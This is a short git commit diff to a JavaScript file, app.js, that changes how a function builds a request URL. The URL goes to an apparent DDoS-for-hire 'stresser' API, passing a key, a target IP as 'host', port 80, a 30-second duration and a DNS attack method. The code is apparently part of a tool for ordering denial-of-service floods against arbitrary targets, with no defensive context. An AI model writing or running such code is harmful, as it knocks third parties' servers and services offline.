8f5030ad1d00a4a19781e24a75263da6f69de2ec
Yves Lorenzo <112036314+ylqgodoy@users.noreply.github.com>
2024-08-26 22:37:56 -0300

    Update app.js

--- app.js
+++ app.js
@@ -64,7 +64,7 @@ async function sendApiRequest(ip) {
         return;
     }
 
-    const url = `https://api.vacstresser.ru/api?key=${token}&ip=${ip}&port=80&time=30&method=DNS`;
+    const url = `https://api.vacstresser.ru/api?key=${token}&host=${ip}&port=80&time=30&method=DNS`;
     console.log(`URL da API: ${url}`);
 
     try {
